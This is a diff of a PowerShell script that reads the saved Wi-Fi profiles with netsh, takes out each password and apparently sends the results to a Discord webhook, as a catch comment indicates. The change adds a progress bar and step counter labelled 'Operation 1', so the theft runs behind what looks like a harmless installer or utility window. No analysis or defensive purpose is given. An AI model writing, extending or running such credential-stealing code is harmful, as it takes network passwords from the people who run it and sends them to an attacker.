@@ -125,8 +125,12 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             # Operation 1 - Extract Wi-Fi profiles
             $textBlock.Text = "Starting Operation 1..."
             try {
-                netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
-                    $wlan = $_.Matches.Value
+                $profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'
+                $profileCount = $profiles.Count
+                $currentProfile = 1
+
+                foreach ($profile in $profiles) {
+                    $wlan = $profile.Matches.Value
                     
                     # Extract the Wi-Fi password
                     try {
@@ -148,6 +152,18 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     } catch {
                         #Write-Host "Failed to send data to Discord webhook"
                     }
+
+                    # Update progress bar value
+                    $progressBar.Value = [math]::Floor(($currentProfile / $profileCount) * 100)
+
+                    $textBlock.Text = "Operation 1: Profile - " + $currentProfile + "/" + $profileCount
+
+                    # Update the window to keep it responsive
+                    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+
+                    # Increment to the next profile
+                    $currentProfile++
+                    Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                 }
                 # Add-Type -AssemblyName PresentationFramework
                 # [System.Windows.MessageBox]::Show('Netsh checked!', 'Notification')
